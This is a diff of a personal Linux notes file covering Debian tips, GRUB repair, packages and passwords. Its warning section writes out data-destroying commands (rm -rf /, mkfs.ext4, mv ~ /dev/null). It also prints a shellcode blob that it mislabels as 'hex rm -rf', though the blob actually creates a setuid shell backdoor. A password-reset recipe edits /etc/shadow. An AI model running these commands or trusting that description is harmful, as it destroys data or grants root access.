@@ -1,14 +1,21 @@
- _____ _            _   _            _             _        ____      _                 _          
-|_   _| |__   ___  | | | | __ _  ___| | _____ _ __( )___   / ___|_ __(_)_ __ ___   ___ (_)_ __ ___ 
-  | | | '_ \ / _ \ | |_| |/ _` |/ __| |/ / _ \ '__|// __| | |  _| '__| | '_ ` _ \ / _ \| | '__/ _ \
-  | | | | | |  __/ |  _  | (_| | (__|   <  __/ |    \__ \ | |_| | |  | | | | | | | (_) | | | |  __/
-  |_| |_| |_|\___| |_| |_|\__,_|\___|_|\_\___|_|    |___/  \____|_|  |_|_| |_| |_|\___/|_|_|  \___|
-                                                                                                   
-    _               _    ____ _____   ____  _                       
-   / \   _ __      / \  |  _ \_   _| / ___|| |_ __ _ _ __  ______ _ 
-  / _ \ | '_ \    / _ \ | |_) || |   \___ \| __/ _` | '_ \|_  / _` |
- / ___ \| | | |  / ___ \|  __/ | |    ___) | || (_| | | | |/ / (_| |
-/_/   \_\_| |_| /_/   \_\_|    |_|   |____/ \__\__,_|_| |_/___\__,_|
+#   ___________  __    __    _______       _______    _______    __     ___      ___     ______    __      _______    _______  
+#  ("     _   ")/" |  | "\  /"     "|     /" _   "|  /"      \  |" \   |"  \    /"  |   /    " \  |" \    /"      \  /"     "| 
+#   )__/  \\__/(:  (__)  :)(: ______)    (: ( \___) |:        | ||  |   \   \  //   |  // ____  \ ||  |  |:        |(: ______) 
+#      \\_ /    \/      \/  \/    |       \/ \      |_____/   ) |:  |   /\\  \/.    | /  /    ) :)|:  |  |_____/   ) \/    |   
+#      |.  |    //  __  \\  // ___)_      //  \ ___  //      /  |.  |  |: \.        |(: (____/ // |.  |   //      /  // ___)_  
+#      \:  |   (:  (  )  :)(:      "|    (:   _(  _||:  __   \  /\  |\ |.  \    /:  | \        /  /\  |\ |:  __   \ (:      "| 
+#       \__|    \__|  |__/  \_______)     \_______) |__|  \___)(__\_|_)|___|\__/|___|  \"_____/  (__\_|_)|__|  \___) \_______) 
+#                                                                                                                              
+
+
+#   _____              _    _                 __              ___  ______  _____   _____  _                                
+#  /  ___|            | |  (_)               /  |            / _ \ | ___ \|_   _| /  ___|| |                               
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| |   ______  / /_\ \| |_/ /  | |   \ `--. | |_  __ _  _ __   ____ __ _  ___ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | |  |______| |  _  ||  __/   | |    `--. \| __|/ _` || '_ \ |_  // _` |/ __|
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_          | | | || |      | |   /\__/ /| |_| (_| || | | | / /| (_| |\__ \
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/          \_| |_/\_|      \_/   \____/  \__|\__,_||_| |_|/___|\__,_||___/
+#                                                                                                                          
+#                                                                                                                          
 
 Carry me always, carry me well.
 I am thy teacher of Linux and shell.
@@ -27,11 +34,13 @@ Who betrays my secrets one by one.
 - Revised with a Linux spin from Eoin Colfer's "Artemis Fowl"
 
 
+
 Scribble scribble scribble, as every mage must do.
 These walls will hold your power fast, unless I walk right through.
 A boat I bade from birch and bark, but burned I did at morn.
 Rather I gather in this held spot, than suffer my hands get worn.
 - Shandalar from Baldur's Gate: Tales of the Sword Coast
+
 
 
 I must not fear. Fear is the mind-killer.
@@ -41,126 +50,291 @@ And when it has gone past I will turn the inner eye to see its path.
 Where the fear has gone there will be nothing. Only I will remain.
 - Frank Herbert, Dune
 
- ____       _     _             
-|  _ \  ___| |__ (_) __ _ _ __  
-| | | |/ _ \ '_ \| |/ _` | '_ \ 
-| |_| |  __/ |_) | | (_| | | | |
-|____/ \___|_.__/|_|\__,_|_| |_|
--------------------------------------------------------------------
-Finding the Fastest Sources for Debian Repos
+
+
+#   _____              _    _                 _____           ______       _      _               
+#  /  ___|            | |  (_)               / __  \          |  _  \     | |    (_)              
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `' / /'  ______  | | | | ___ | |__   _   __ _  _ __  
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \    / /   |______| | | | |/ _ \| '_ \ | | / _` || '_ \ 
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | ./ /___          | |/ /|  __/| |_) || || (_| || | | |
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \_____/          |___/  \___||_.__/ |_| \__,_||_| |_|
+#                                                                                                 
+#                                                                                                 
+
+
+#   _______ __           __      __   __               _______               __                __        _______                              
+#  |    ___|__|.-----.--|  |    |  |_|  |--.-----.    |    ___|.---.-.-----.|  |_.-----.-----.|  |_     |     __|.-----.--.--.----.----.-----.
+#  |    ___|  ||     |  _  |    |   _|     |  -__|    |    ___||  _  |__ --||   _|  -__|__ --||   _|    |__     ||  _  |  |  |   _|  __|  -__|
+#  |___|   |__||__|__|_____|    |____|__|__|_____|    |___|    |___._|_____||____|_____|_____||____|    |_______||_____|_____|__| |____|_____|
+#                                                                                                                                             
+
 A command line tool called “netselect-apt” is available to find the fastest debian mirror.
 The output file is written to OUTFILE.
-	sudo aptitude install netselect-apt
+#	sudo aptitude install netselect-apt
 The command will look something like this when used
-	netselect-apt -c australia -t 15 -a amd64 -n testing
+#	netselect-apt -c australia -t 15 -a amd64 -n testing
 
-	man netselect-apt for command line options
 
--------------------------------------------------------------------
-Compiling SID packages into Wheezy
+#   ______                        __ __ __                   _______ __     __      ______              __                            
+#  |      |.-----.--------.-----.|__|  |__|.-----.-----.    |     __|__|.--|  |    |   __ \.---.-.----.|  |--.---.-.-----.-----.-----.
+#  |   ---||  _  |        |  _  ||  |  |  ||     |  _  |    |__     |  ||  _  |    |    __/|  _  |  __||    <|  _  |  _  |  -__|__ --|
+#  |______||_____|__|__|__|   __||__|__|__||__|__|___  |    |_______|__||_____|    |___|   |___._|____||__|__|___._|___  |_____|_____|
+#                         |__|                   |_____|                                                           |_____|            
 Install the Debian source (and the development tools, especially debhelper, devscripts, and build-essential), and then build the package.
 Step by step:
-	add a deb-src line for sid to your sources.list
 
-	apt-get update
-	apt-get build-dep PACKAGE_NAME
-	apt-get -b source PACKAGE_NAME
-The resulting debs should be in the current directory and can be installed with dpkg -i the.deb.
+add a deb-src line for sid to your sources.list
+#	deb-src http://debian.osuosl.org/debian/ sid main contrib non-free
 
--------------------------------------------------------------------
-Checking updates for stability
-	sudo apt-get install apt-listbugs
+#	apt-get update
+#	apt-get build-dep PACKAGE_NAME
+#	apt-get -b source PACKAGE_NAME
+The resulting debs should be in the current directory and can be installed with
+#	dpkg -i *.deb
 
--------------------------------------------------------------------
-Changing hostname
+
+#   ______ __                                 _______               __                                    
+#  |      |  |--.---.-.-----.-----.-----.    |   |   |.-----.-----.|  |_.-----.---.-.--------.-----.-----.
+#  |   ---|     |  _  |     |  _  |  -__|    |       ||  _  |__ --||   _|     |  _  |        |  -__|__ --|
+#  |______|__|__|___._|__|__|___  |_____|    |___|___||_____|_____||____|__|__|___._|__|__|__|_____|_____|
+#                           |_____|                                                                       
 In order to change the hostname of the computer, you need to change the old hostname present in all the areas below to the new hostname.
-	/etc/exim4/update-exim4.conf.conf \
-	/etc/printcap \
-	/etc/hostname \
-	/etc/hosts \
-	/etc/ssh/ssh_host_rsa_key.pub \
-	/etc/ssh/ssh_host_dsa_key.pub \
-	/etc/motd \
-	/etc/ssmtp/ssmtp.conf
+#	/etc/exim4/update-exim4.conf.conf \
+#	/etc/printcap \
+#	/etc/hostname \
+#	/etc/hosts \
+#	/etc/ssh/ssh_host_rsa_key.pub \
+#	/etc/ssh/ssh_host_dsa_key.pub \
+#	/etc/motd \
+#	/etc/ssmtp/ssmtp.conf
 Then reboot the computer. The new hostname should be used immediately.
 
--------------------------------------------------------------------
-Debian KDE Plasma 5 missing window decorations
-	If windows are missing titlebar, and all window decoration in Plasma 5, install kwin (or the newest version of kwin available in Sid)
 
-  ____ ____  _   _ ____  
- / ___|  _ \| | | | __ ) 
-| |  _| |_) | | | |  _ \ 
-| |_| |  _ <| |_| | |_) |
- \____|_| \_\\___/|____/ 
--------------------------------------------------------------------
-Installing grub-customizer on Debian
+#             __         __          __   __        __                          _____         __     __              
+#  .--------.|__|.-----.|  |_.-----.|  |_|__|.----.|  |--.    .-----.-----.    |     \.-----.|  |--.|__|.---.-.-----.
+#  |        ||  ||     ||   _|__ --||   _|  ||  __||    <     |  _  |     |    |  --  |  -__||  _  ||  ||  _  |     |
+#  |__|__|__||__||__|__||____|_____||____|__||____||__|__|    |_____|__|__|    |_____/|_____||_____||__||___._|__|__|
+#                                                                                                                    
+Mintstick is a handy tool to use for formatting and creating USB sticks. It's so much easier to use this tool than use fdisk or mkfs
+It also includes an imagewriter that makes creating Live Linux USB drives a snap!
+However, this package is only included on Linux Mint distros. If you're not using Mint, you'll need to follow the steps below.
+#        wget http://packages.linuxmint.com/pool/main/m/mintstick/mintstick_1.3.7_all.deb
+#        sudo dpkg -i mintstick_1.3.7_all.deb
+It probably won't install because of missing packages, so...
+#        sudo apt-get install -f
+
+
+#   _____                 __  __        ______                                                       ___         ___
+#  |     \ .-----..-----.|  ||  |_     |   __ \.--.--..-----.    .----..--------.     ______ .----..'  _|       /  /
+#  |  --  ||  _  ||     | |_||   _|    |      <|  |  ||     |    |   _||        |    |______||   _||   _|     ,' ,' 
+#  |_____/ |_____||__|__|    |____|    |___|__||_____||__|__|    |__|  |__|__|__|            |__|  |__|      /__/   
+#                                                                                                                   
+This is probably the most dangerous command you can use on Linux
+#	rm -rf /
+This command deletes everything it possibly can, including all data on the hard drive, and all data on connected removable media devices.
+
+Some trolls will attempt to get you to run this command by disguising it
+
+#	char esp[] __attribute__ ((section(".text"))) /* e.s.p
+#	release */
+#	= "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
+#	"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
+#	"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
+#	"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
+#	"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
+#	"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
+#	"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
+#	"cp -p /bin/sh /tmp/.beyond; chmod 4755
+#	/tmp/.beyond;";
+
+This is the hex version of rm -rf.
+It will also delete everything just like the above command.
+
+
+#   _______                __    __                      _____                                                              ______                                              __ 
+#  |   _   |.-----..-----.|  |_ |  |--..-----..----.    |     \ .---.-..-----..-----..-----..----..-----..--.--..-----.    |      |.-----..--------..--------..---.-..-----..--|  |
+#  |       ||     ||  _  ||   _||     ||  -__||   _|    |  --  ||  _  ||     ||  _  ||  -__||   _||  _  ||  |  ||__ --|    |   ---||  _  ||        ||        ||  _  ||     ||  _  |
+#  |___|___||__|__||_____||____||__|__||_____||__|      |_____/ |___._||__|__||___  ||_____||__|  |_____||_____||_____|    |______||_____||__|__|__||__|__|__||___._||__|__||_____|
+#                                                                             |_____|                                                                                              
+/dev/null is a special directory. Moving something to /dev/null is the same thing as destroying it.
+#	mv ~ /dev/null
+So this command would delete your entire home directory.
+
+
+#   _____                 __  __        ______                              __      ___                           __    _____          ___    __                   ___           __         ____   
+#  |     \ .-----..-----.|  ||  |_     |   __ \.--.--..-----.    .--------.|  |--..'  _|.-----.    .-----..--.--.|  |_ |  |  |        /  /.--|  |.-----..--.--.   /  /.-----..--|  |.---.-.|_   |  
+#  |  --  ||  _  ||     | |_||   _|    |      <|  |  ||     |    |        ||    < |   _||__ --| __ |  -__||_   _||   _||__    |     ,' ,' |  _  ||  -__||  |  | ,' ,' |__ --||  _  ||  _  | _|  |_ 
+#  |_____/ |_____||__|__|    |____|    |___|__||_____||__|__|    |__|__|__||__|__||__|  |_____||__||_____||__.__||____|   |__|     /__/   |_____||_____| \___/ /__/   |_____||_____||___._||______|
+#                                                                                                                                                                                                  
+Another dangerous command to avoid is
+#	mkfs.ext4 /dev/sda1
+This command will format the hard drive and replace your current drive (and all your files) with a new ext4 partition.
+
+
+#   _______  __                _____                                           ___ ___                    _______  __                   __     __      __  __                         
+#  |_     _||  |--..-----.    |     |_ .-----..-----..-----..-----..-----.    |   |   |.-----..--.--.    |     __||  |--..-----..--.--.|  |.--|  |    |  |/  |.-----..-----..--.--.--.
+#    |   |  |     ||  -__|    |       ||  -__||__ --||__ --||  _  ||     |     \     / |  _  ||  |  |    |__     ||     ||  _  ||  |  ||  ||  _  |    |     < |     ||  _  ||  |  |  |
+#    |___|  |__|__||_____|    |_______||_____||_____||_____||_____||__|__|      |___|  |_____||_____|    |_______||__|__||_____||_____||__||_____|    |__|\__||__|__||_____||________|
+#                                                                                                                                                                                     
+DON'T RUN WEIRD LOOKING, OBVIOUSLY DISGUISED CODE, OR COMMANDS THAT YOU DON'T UNDERSTAND
+
+
+#   _____              _    _                 _____            _____ ______  _   _ ______ 
+#  /  ___|            | |  (_)               |____ |          |  __ \| ___ \| | | || ___ \
+#  \ `--.   ___   ___ | |_  _   ___   _ __       / /  ______  | |  \/| |_/ /| | | || |_/ /
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \      \ \ |______| | | __ |    / | | | || ___ \
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | .___/ /          | |_\ \| |\ \ | |_| || |_/ /
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \____/            \____/\_| \_| \___/ \____/ 
+#                                                                                         
+#                                                                                         
+
+
+#                     __                             __                   __                                         _____         __     __              
+#  .-----.----.--.--.|  |--.______.----.--.--.-----.|  |_.-----.--------.|__|.-----.-----.----.    .-----.-----.    |     \.-----.|  |--.|__|.---.-.-----.
+#  |  _  |   _|  |  ||  _  |______|  __|  |  |__ --||   _|  _  |        ||  ||-- __|  -__|   _|    |  _  |     |    |  --  |  -__||  _  ||  ||  _  |     |
+#  |___  |__| |_____||_____|      |____|_____|_____||____|_____|__|__|__||__||_____|_____|__|      |_____|__|__|    |_____/|_____||_____||__||___._|__|__|
+#  |_____|                                                                                                                                                
 Step 1:	Install these packages
-	sudo aptitude cmake g++ libgtkmm-3.0-dev gettext libssl-dev libarchive-dev hwinfo
+#	sudo aptitude cmake g++ libgtkmm-3.0-dev gettext libssl-dev libarchive-dev hwinfo
 
-Step 2:	Download the Sources
-	wget https://launchpad.net/grub-customizer/5.0/5.0.6/+download/grub-customizer_5.0.6.tar.gz
+Step 2:	Download the Sources and Extract
+#	wget https://launchpad.net/grub-customizer/5.0/5.0.6/+download/grub-customizer_5.0.6.tar.gz
 
-	tar zxvf grub-customizer_5.0.6.tar.gz
-	cd grub-customizer-5.0.6/
+#	tar zxvf grub-customizer_5.0.6.tar.gz
+#	cd grub-customizer-5.0.6/
 
 Step 3: Compile the Sources
-	cmake .&& make -j8
-	sudo make install
+#	cmake .&& make -j8
+#	sudo make install
 
 If you made a mistake or don't want Grub Customizer installed just type inside grub-customizer-5.0.6 directory:
-	make uninstall
-	cd ..;rm -rf grub-customizer-5.0.6
+#	make uninstall
+#	cd ..;rm -rf grub-customizer-5.0.6
 
- ____            _                         
-|  _ \ __ _  ___| | ____ _  __ _  ___  ___ 
-| |_) / _` |/ __| |/ / _` |/ _` |/ _ \/ __|
-|  __/ (_| | (__|   < (_| | (_| |  __/\__ \
-|_|   \__,_|\___|_|\_\__,_|\__, |\___||___/
-                           |___/           
--------------------------------------------------------------------
-Finding All the Packages
+
+#   _______                          __     __                    _______  ______  _______  ______ 
+#  |_     _|.--.--.--..-----..---.-.|  |--.|__|.-----..-----.    |     __||   __ \|   |   ||   __ \
+#    |   |  |  |  |  ||  -__||  _  ||    < |  ||     ||  _  |    |    |  ||      <|   |   ||   __ <
+#    |___|  |________||_____||___._||__|__||__||__|__||___  |    |_______||___|__||_______||______/
+#                                                     |_____|                                      
+Your GRUB settings are stored in. This is the file you edit to change GRUB settings.
+#	/etc/default/grub
+Scripts are located in: Be careful editing or changing any scripts here. Serious system damage can result.
+#	/etc/grub.d/
+After editing things, run the command
+#	update-grub
+
+This makes GRUB automatically combines the settings from the /etc/default/grub, the scripts from the /etc/grub.d/, and creates a /boot/grub/grub.cfg file that’s read at boot.
+
+WARNING!! MAY KILL KITTENS!!
+It is possible to edit the file in /boot/grub/grub.cfg
+
+
+#   ______                                          __                    _______  ______  _______  ______ 
+#  |   __ \.-----..----..-----..--.--..-----..----.|__|.-----..-----.    |     __||   __ \|   |   ||   __ \
+#  |      <|  -__||  __||  _  ||  |  ||  -__||   _||  ||     ||  _  |    |    |  ||      <|   |   ||   __ <
+#  |___|__||_____||____||_____| \___/ |_____||__|  |__||__|__||___  |    |_______||___|__||_______||______/
+#                                                             |_____|                                      
+Boot into your Linux LiveCD (use the same version as the one you are recovering, if possible).
+Open Terminal and type:
+#	sudo fdisk -l /dev/sdX					(Replace X with correct letter if you know which partition you use.
+#								(Use /dev/sd* for a full report on all partitions)
+Under this list you can see which one is the Linux Mint partition. It’s usually /dev/sda1/ unless you are dual-booting.
+You need to mount the Linux Mint partition so you can access it. To do this, type:
+#	sudo mount /dev/sdXY /mnt				(Replace X with the correct letter, and Y with the correct number)
+Now you need to tell Linux Mint to install grub2 to the partition you just mounted. To do this, type:
+#	sudo grub-install --root-directory=/mnt/ /dev/sdX	(replace X with correct letter)
+(It is IMPORTANT that you do NOT enter any number, just the letter of the partition)
+Now reboot the computer. You should see a GRUB menu pop up when the reboot is done. If you are dual-booting you may need to refresh GRUB so it detects any Windows partitions. To do this, log in, and open a Terminal and type:
+#	sudo update-grub
+		
+
+#   _____              _    _                   ___           ______               _                             
+#  /  ___|            | |  (_)                 /   |          | ___ \             | |                            
+#  \ `--.   ___   ___ | |_  _   ___   _ __    / /| |  ______  | |_/ /  __ _   ___ | | __  __ _   __ _   ___  ___ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \  / /_| | |______| |  __/  / _` | / __|| |/ / / _` | / _` | / _ \/ __|
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | \___  |          | |    | (_| || (__ |   < | (_| || (_| ||  __/\__ \
+#  \____/  \___| \___| \__||_| \___/ |_| |_|     |_/          \_|     \__,_| \___||_|\_\ \__,_| \__, | \___||___/
+#                                                                                                __/ |           
+#                                                                                               |___/            
+
+
+#   ______              __                           _______             __     __              
+#  |   __ \.---.-.----.|  |--.---.-.-----.-----.    |   _   |.----.----.|  |--.|__|.--.--.-----.
+#  |    __/|  _  |  __||    <|  _  |  _  |  -__|    |       ||   _|  __||     ||  ||  |  |  -__|
+#  |___|   |___._|____||__|__|___._|___  |_____|    |___|___||__| |____||__|__||__| \___/|_____|
+#                                  |_____|                                                      
 If you haven't cleaned this folder recently, you can find every package you've installed in /var/cache/apt/archives
 This is useful to roll back to a previous version if something breaks.
 
- _            _ 
-(_)_ __ __  _(_)
-| | '_ \\ \/ / |
-| | | | |>  <| |
-|_|_| |_/_/\_\_|
--------------------------------------------------------------------
-Installing inxi on Debian
-A few Debian based distributions package inxi, or include the inxi installer in their base systems, like Linux Mint.
-As of Debian Jesse, Debian Sid/Testing - inxi is in apt, so just do:
-	apt-get install inxi
-If you're on Debian Wheezy, add the deb-src for Jessie and Sid, and compile a backport of the package
 
-If in doubt, just search for it in apt, it's there, install it.
-	apt-cache search inxi
+#   _______                               ___         __         __    
+#  |     __|.----.----.-----.-----.-----.'  _|.-----.|  |_.----.|  |--.
+#  |__     ||  __|   _|  -__|  -__|     |   _||  -__||   _|  __||     |
+#  |_______||____|__| |_____|_____|__|__|__|  |_____||____|____||__|__|
+#                                                                      
+Screenfetch is a really cool way of displaying infos about your computer in a Terminal.
+#        wget -O screenfetch 'https://raw.github.com/KittyKatt/screenfetch/master/screenfetch-dev'
+#        chmod +x screenfetch
+#        sudo mv screenfetch /usr/bin/
 
-For older systems, use the generally out of date cathbards repo:
-	wget ftp://cathbard.com/binary/inxi*.deb
-	sudo dpkg -i inxi...
-	sudo apt-get install -f
-Or if you have cathbards repos ( add cathbard repos ) in your apt sources.list:
-	apt-get update && apt-get install inxi
-Then update inxi
-        sudo inxi -U
 
--------------------------------------------------------------------
-Allowing inxi to self-update on Mint
+#   _____              _    _                 _____            _   ________  _____ 
+#  /  ___|            | |  (_)               |  ___|          | | / /|  _  \|  ___|
+#  \ `--.   ___   ___ | |_  _   ___   _ __   |___ \   ______  | |/ / | | | || |__  
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \      \ \ |______| |    \ | | | ||  __| 
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | /\__/ /          | |\  \| |/ / | |___ 
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \____/           \_| \_/|___/  \____/ 
+#                                                                                  
+#                                                                                  
+
+
+#   ______ __                                            __               __                             __           __                         __                               __   __                    
+#  |   __ \  |.---.-.-----.--------.---.-.    .--------.|__|.-----.-----.|__|.-----.-----.    .--.--.--.|__|.-----.--|  |.-----.--.--.--.    .--|  |.-----.----.-----.----.---.-.|  |_|__|.-----.-----.-----.
+#  |    __/  ||  _  |__ --|        |  _  |    |        ||  ||__ --|__ --||  ||     |  _  |    |  |  |  ||  ||     |  _  ||  _  |  |  |  |    |  _  ||  -__|  __|  _  |   _|  _  ||   _|  ||  _  |     |__ --|
+#  |___|  |__||___._|_____|__|__|__|___._|    |__|__|__||__||_____|_____||__||__|__|___  |    |________||__||__|__|_____||_____|________|    |_____||_____|____|_____|__| |___._||____|__||_____|__|__|_____|
+#                                                                                  |_____|                                                                                                                   
+        If windows are missing titlebar, and all window decoration in Plasma 5, install kwin (or the newest version of kwin available in Sid)
+
+
+#   _____              _    _                  ____            _               _ 
+#  /  ___|            | |  (_)                / ___|          (_)             (_)
+#  \ `--.   ___   ___ | |_  _   ___   _ __   / /___   ______   _  _ __  __  __ _ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \  | ___ \ |______| | || '_ \ \ \/ /| |
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | | \_/ |          | || | | | >  < | |
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \_____/          |_||_| |_|/_/\_\|_|
+#                                                                                
+#                                                                                
+
+
+#   _______               __     __                          __   ___                       __         __         
+#  |    ___|.-----.---.-.|  |--.|  |.-----.    .-----.-----.|  |.'  _|______.--.--.-----.--|  |.---.-.|  |_.-----.
+#  |    ___||     |  _  ||  _  ||  ||  -__|    |__ --|  -__||  ||   _|______|  |  |  _  |  _  ||  _  ||   _|  -__|
+#  |_______||__|__|___._||_____||__||_____|    |_____|_____||__||__|        |_____|   __|_____||___._||____|_____|
+#                                                                                 |__|                            
 The inxi program has been neutered on most Linux distros so it can't update using -U
 To allow updating, open a Terminal and
 	sudo touch /etc/inxi.conf && echo 'B_ALLOW_UPDATE=true' >> /etc/inxi.conf
- ____                                     _     
-|  _ \ __ _ ___ _____      _____  _ __ __| |___ 
-| |_) / _` / __/ __\ \ /\ / / _ \| '__/ _` / __|
-|  __/ (_| \__ \__ \\ V  V / (_) | | | (_| \__ \
-|_|   \__,_|___/___/ \_/\_/ \___/|_|  \__,_|___/
--------------------------------------------------------------------
-Generating Passwords
 
-	sudo aptitude install makepasswd
+
+#   _____              _    _                 ______          ______                                              _      
+#  /  ___|            | |  (_)               |___  /          | ___ \                                            | |     
+#  \ `--.   ___   ___ | |_  _   ___   _ __      / /   ______  | |_/ /  __ _  ___  ___ __      __  ___   _ __   __| | ___ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \    / /   |______| |  __/  / _` |/ __|/ __|\ \ /\ / / / _ \ | '__| / _` |/ __|
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | ./ /             | |    | (_| |\__ \\__ \ \ V  V / | (_) || |   | (_| |\__ \
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \_/              \_|     \__,_||___/|___/  \_/\_/   \___/ |_|    \__,_||___/
+#                                                                                                                        
+#                                                                                                                        
+
+
+#   _______                                __              ______                                           __        
+#  |     __|.-----.-----.-----.----.---.-.|  |_.-----.    |   __ \.---.-.-----.-----.--.--.--.-----.----.--|  |.-----.
+#  |    |  ||  -__|     |  -__|   _|  _  ||   _|  -__|    |    __/|  _  |__ --|__ --|  |  |  |  _  |   _|  _  ||__ --|
+#  |_______||_____|__|__|_____|__| |___._||____|_____|    |___|   |___._|_____|_____|________|_____|__| |_____||_____|
+#                                                                                                                     
+Many passwords can be created effortlessly using makepasswd
+
+#	sudo aptitude install makepasswd
 
 makepasswd - generate and/or encrypt passwords
 	makepasswd  [ --chars N ] [ --clearfrom file ] [ --count N ] [ --crypt | --nocrypt | --crypt-md5 ] [ --cryptsalt N ] [ --help ] [ --maxchars N ] [ --minchars N ] [ --randomseed N ] [ --rerandom N ] [ --repeatpass N] [ --string string ] [ --verbose | --noverbose ]
@@ -169,386 +343,490 @@ makepasswd - generate and/or encrypt passwords
 		--count # (Generate a total of # passwords - default is 1)
 		--crypt (Produce encrypted passwords)
 		--crypt-md5 (Produce encrypted passwords using MD5)
+
 	I like using makepasswd this way
-		touch FILE
-		(Enter a password into the file)
-		makepasswd --clearfrom FILE --repeatpass 30 --crypt >> passwordfile
-		makepasswd --clearfrom FILE --repeatpass 30 --crypt-md5 >> passwordfile
-               _       
- ___ _   _  __| | ___  
-/ __| | | |/ _` |/ _ \ 
-\__ \ |_| | (_| | (_) |
-|___/\__,_|\__,_|\___/ 
--------------------------------------------------------------------
+#		touch FILE
+#		(Enter a password into the file)
+#		makepasswd --clearfrom FILE --repeatpass 30 --crypt >> passwordfile
+#		makepasswd --clearfrom FILE --repeatpass 30 --crypt-md5 >> passwordfile
+
+
+#   ______                       __        _____                  __        _______  __                   __               ______                                                 __ 
+#  |   __ \.-----..-----..-----.|  |_     |     |_ .-----..-----.|  |_     |   |   ||  |--..--.--..-----.|  |_ .--.--.    |   __ \.---.-..-----..-----..--.--.--..-----..----..--|  |
+#  |      <|  -__||__ --||  -__||   _|    |       ||  _  ||__ --||   _|    |   |   ||  _  ||  |  ||     ||   _||  |  |    |    __/|  _  ||__ --||__ --||  |  |  ||  _  ||   _||  _  |
+#  |___|__||_____||_____||_____||____|    |_______||_____||_____||____|    |_______||_____||_____||__|__||____||_____|    |___|   |___._||_____||_____||________||_____||__|  |_____|
+#                                                                                                                                                                                    
+To Reset a Lost Password on Ubuntu
+Boot from a live CD
+Mount the computer’s hard drive
+Open Terminal.
+If using Ubuntu Live CD, type
+#	gksudo nautilus
+If using Linux Mint Live CD, type
+#	gksudo nemo
+If using Linux Mint KDE Live CD, type
+#	kdesudo dolphin
+Go to mounted drive, and find the /etc/ directory
+Scroll past all the directories until you find the shadow text file
+Create a backup of the shadow text file
+Edit the file
+Scroll down to the username in question and replace the encrypted password with:
+#	U6aMy0wojraho
+Reboot
+
+
+#   ______         __                    _______             _______         __                _______                                       ______                                                 __        
+#  |   __ \.--.--.|  |.-----..-----.    |_     _|.-----.    |   |   |.---.-.|  |--..-----.    |     __|.-----..----..--.--..----..-----.    |   __ \.---.-..-----..-----..--.--.--..-----..----..--|  |.-----.
+#  |      <|  |  ||  ||  -__||__ --|      |   |  |  _  |    |       ||  _  ||    < |  -__|    |__     ||  -__||  __||  |  ||   _||  -__|    |    __/|  _  ||__ --||__ --||  |  |  ||  _  ||   _||  _  ||__ --|
+#  |___|__||_____||__||_____||_____|      |___|  |_____|    |__|_|__||___._||__|__||_____|    |_______||_____||____||_____||__|  |_____|    |___|   |___._||_____||_____||________||_____||__|  |_____||_____|
+#                                                                                                                                                                                                             
+A strong password has at least 16 characters
+A strong password uses uppercase letters.
+A strong password is NOT made up of only uppercase letters.
+A strong password uses lowercase letters.
+A strong password is NOT made up of only lowercase letters.
+A strong password uses numbers.
+A strong password is NOT made up of only numbers.
+A strong password uses symbols, such as !@#$%^&*()<>?:”{}+_
+A strong password is NOT made up of only symbols.
+
+A strong password is NOT found on only one row of the keyboard.
+A strong password is NOT a series of similar keypresses on the keyboard.
+
+A strong password is NOT like your previous password.
+
+A strong password is NOT your name, and does NOT use any part of your name.
+A strong password is NOT your login ID, and does NOT use any part of your login ID
+
+A strong password is NOT your friend’s name.
+A strong password is NOT the password your friend uses.
+
+A strong password is NOT a family member’s name.
+A strong password is NOT the password a family member uses.
+
+A strong password is NOT a dictionary word.
+
+A strong password is NOT your bank account number.
+A strong password is NOT your social security number
+A strong password is NOT your zip code, and does NOT use any part of your mailing address (either past or present)
+A strong password is NOT your military ID number.
+
+A strong password is NOT a password that unlocks a bunch of stored passwords.
+
+A strong password is NEVER used as a login ID somewhere else.
+
+
+#   ______                                                 __      ________         __            __  __                 
+#  |   __ \.---.-..-----..-----..--.--.--..-----..----..--|  |    |  |  |  |.-----.|  |--..-----.|__||  |_ .-----..-----.
+#  |    __/|  _  ||__ --||__ --||  |  |  ||  _  ||   _||  _  |    |  |  |  ||  -__||  _  ||__ --||  ||   _||  -__||__ --|
+#  |___|   |___._||_____||_____||________||_____||__|  |_____|    |________||_____||_____||_____||__||____||_____||_____|
+#                                                                                                                        
+If you're too lazy to use some of the commands above to make passwords, there are websites that can do it as well.
+#	http://maord.com/
+		I highly recommend this site for generating passwords as it can generate up to 2500 passwords at a time (viewable as a webpage, or downloadable in CSV format or plain text)
+		and includes features like MD5 and SHA1 hash values for encryption.
+
+#	www.passwordcard.org/en
+		For those of you who feel the need to have your passwords in print, Password Card does just that.
+		It prints multiple secure passwords on a wallet-sized card for you to print, laminate, and save.
+		Each card comes with 37 very secure passwords (8 passwords, 29 characters in length horizontally and 29 passwords, 8 characters in length vertically).
+
+#	www.passwordchart.com/ -
+		This is a unique way to make a password! Type in a passphrase, and it generates a wallet-size chart for you.
